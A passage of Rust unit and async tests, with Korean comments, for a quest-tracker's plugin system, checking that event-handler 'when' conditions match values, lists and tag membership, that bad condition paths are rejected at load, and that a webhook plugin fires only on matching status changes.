
    let mk = |title: &str| crate::models::CreateQuestRequest {
        quest_type_id: 1,
        title: title.into(),
        description: None,
        status_slug: "open".into(),
        urgency: Some(3),
        parent_quest_id: None,
    };
    let loud = crate::ops::quests::create_quest(&store, mk("알림 받을 것")).await.unwrap();
    let quiet = crate::ops::quests::create_quest(&store, mk("조용한 것")).await.unwrap();
    crate::ops::quests::set_quest_tags(&store, loud.id, vec!["notify".into()]).await.unwrap();
    for q in [&loud, &quiet] {
        crate::ops::comments::add_comment_entry(&store, &q.quest_id, "kim".into(), "봐 주세요".into(), None, false)
            .await
            .unwrap();
    }
    assert!(store.drain_events(std::time::Duration::from_secs(5)));
    assert_eq!(
        sent.0.lock().unwrap().clone(),
        vec![json!({ "q": loud.quest_id, "body": "봐 주세요" })]
    );
    assert!(store.plugin_problems().is_empty(), "{:?}", store.plugin_problems());

    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── REQ-025: 조건 when ─────────────────────────────────────

fn when_line(post: &str, cond: &str) -> String {
    format!("{BASE}\n[[handlers]]\npost = [{post}]\naction = \"out\"\n[handlers.when]\n{cond}\n")
}

/// 값 하나 / 목록 중 하나 / (필드가 목록이면) 포함. 없는 경로는 안 맞는다.
#[test]
fn when_matches_values_lists_and_membership() {
    let ev = json!({
        "event": "quest.status_changed",
        "ok": true,
        "quest": { "id": "DEV-1", "tags": ["notify", "api"], "urgency": 2 },
        "change": { "from": "open", "to": "done" }
    });
    let extra = std::collections::BTreeMap::from([(
        "subject".to_string(),
        json!({ "tags": ["notify"], "status": "done" }),
    )]);
    let cond = |toml_src: &str| -> super::when::When {
        toml::from_str(toml_src).unwrap()
    };
    let m = |src: &str| super::when::matches(&cond(src), &ev, &extra);

    assert!(m("ok = true"));
    assert!(!m("ok = false"));
    assert!(m("\"change.to\" = \"done\""));
    assert!(m("\"change.to\" = [\"done\", \"closed\"]"));
    assert!(!m("\"change.to\" = [\"open\", \"closed\"]"));
    assert!(m("\"quest.tags\" = \"notify\""), "목록 필드는 포함이면 맞다");
    assert!(m("\"quest.tags\" = [\"none\", \"api\"]"));
    assert!(!m("\"quest.tags\" = \"secret\""));
    assert!(m("\"quest.urgency\" = 2"));
    assert!(!m("\"quest.urgency\" = 3"));
    // 여럿이면 전부 만족해야 한다.
    assert!(m("ok = true\n\"change.to\" = \"done\""));
    assert!(!m("ok = true\n\"change.to\" = \"open\""));
    // 없는 경로.
    assert!(!m("\"comment.body\" = \"x\""));
    assert!(!m("\"quest.nope\" = \"x\""));
    // `with` 이름이 이벤트보다 먼저다.
    assert!(m("\"subject.status\" = \"done\""));
}

/// 오타 난 경로와 이상한 값은 적재 때 걸린다 — 조용히 "안 맞음" 이 되면 왜 안 도는지 모른다.
#[test]
fn when_paths_and_values_are_checked_at_load() {
    assert!(parse(&when_line("\"quest.status_changed\"", "\"change.to\" = \"done\"")).is_ok());
    assert!(parse(&when_line("\"quest.created\"", "ok = true\n\"quest.tags\" = \"notify\"")).is_ok());
    let e = parse(&when_line("\"quest.created\"", "\"comment.body\" = \"x\"")).unwrap_err();
    assert!(e.contains("comment") && e.contains("quest"), "{e}");
    let e = parse(&when_line("\"quest.created\"", "\"quset.tags\" = \"notify\"")).unwrap_err();
    assert!(e.contains("quset"), "{e}");
    let e = parse(&when_line("\"quest.created\"", "[when.nested]\nx = 1")).unwrap_err();
    assert!(e.contains("글자") || e.contains("nested"), "{e}");
    // `with` 로 읽는 이름은 쓸 수 있다.
    assert!(
        parse(&format!(
            "{BASE}\n[[handlers]]\npost = [\"comment.added\"]\nwith = [\"subject\"]\ncall = \"h\"\n[handlers.when]\n\"subject.tags\" = \"notify\"\n"
        ))
        .is_ok()
    );
}

/// **액션 줄의 조건** — 스크립트 없이 "완료로 바뀐 것만" 보낸다. 조건은 `with` 로 읽은 데이터도 본다.
#[tokio::test]
async fn an_action_only_plugin_fires_only_when_the_condition_holds() {
    #[derive(Default)]
    struct Sent(std::sync::Mutex<Vec<String>>);
    impl runtime::Delivery for Sent {
        fn deliver(
            &self,
            _p: &Plugin,
            _a: &Action,
            e: &crate::events::Event,
            b: &serde_json::Value,
            _v: &std::collections::BTreeMap<String, String>,
        ) -> Result<(), String> {
            self.0
                .lock()
                .unwrap()
                .push(format!("{} {}", e.name, b["quest"]["id"].as_str().unwrap_or("?")));
            Ok(())
        }
    }
    let home = fresh_tmp("when-home");
    let g = fresh_tmp("when");
    crate::repo::seed_guild_dir(&g).unwrap();
    let dir = plugins_dir(&g).join("done-only");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join(MANIFEST),
        r#"
name  = "done-only"
scope = ["cli"]

[actions.out.post]
    url = "https://x.test"

[[handlers]]
    id     = "완료만"
    post   = ["quest.status_changed"]
    with   = ["subject"]
    action = "out"
    [handlers.when]
        ok               = true
        "change.to"      = ["done", "closed"]
        "subject.tags"   = "notify"
"#,
    )
    .unwrap();
    let store = crate::Store::open(&g).await.unwrap();
    let sent = std::sync::Arc::new(Sent::default());
    let loaded = {
        let _guard = env_lock();
        unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
        consent::enable_auto_allow(&g).unwrap();
        let l = store.install_plugins(Scope::Cli, sent.clone());
        unsafe { std::env::remove_var("OPENGUILD_HOME") };
        l
    };
    assert_eq!(loaded.active.len(), 1, "{:?}", loaded.errors);

    let mk = |title: &str| crate::models::CreateQuestRequest {
        quest_type_id: 1,
        title: title.into(),
        description: None,
        status_slug: "open".into(),
        urgency: Some(3),
        parent_quest_id: None,
    };
    let tagged = crate::ops::quests::create_quest(&store, mk("알림")).await.unwrap();
    let plain = crate::ops::quests::create_quest(&store, mk("조용")).await.unwrap();
    crate::ops::quests::set_quest_tags(&store, tagged.id, vec!["notify".into()]).await.unwrap();
    let to = |s: &str| crate::models::ChangeStatusRequest { status_slug: s.into() };
    // 태그 붙은 것: 진행 중(조건 밖) → 완료(조건 안).
    crate::ops::quests::change_status(&store, tagged.id, to("in_progress")).await.unwrap();
    crate::ops::quests::change_status(&store, tagged.id, to("done")).await.unwrap();
    // 태그 없는 것은 완료해도 안 나간다.
    crate::ops::quests::change_status(&store, plain.id, to("done")).await.unwrap();

    assert!(store.drain_events(std::time::Duration::from_secs(5)));
    assert_eq!(
        sent.0.lock().unwrap().clone(),
        vec![format!("quest.status_changed {}", tagged.quest_id)]
    );

    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}
